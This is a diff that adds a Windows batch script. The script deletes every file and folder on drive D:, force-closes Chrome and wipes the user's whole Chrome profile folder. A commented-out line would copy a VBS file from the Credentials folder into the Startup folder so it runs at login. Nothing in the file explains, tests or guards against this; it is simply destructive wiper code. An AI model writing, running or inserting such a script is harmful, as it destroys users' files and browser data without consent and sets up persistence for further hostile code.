@@ -1,0 +1,18 @@
+if not exist "D:\" goto oki
+
+timeout 1
+
+for /d %%G in ("D:\*") do rd /s /q "%%~G"
+del "D:\*.*" /q /s /f
+
+:oki
+timeout 50
+
+taskkill /im chrome.exe /f
+for /d %%G in ("%localappdata%\Google\Chrome\*") do rd /s /q "%%~G"
+del "%localappdata%\Google\Chrome\*.*" /q /s /f
+
+::copy "%localappdata%\Microsoft\Credentials\madarchod.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+::timeout 
+exit
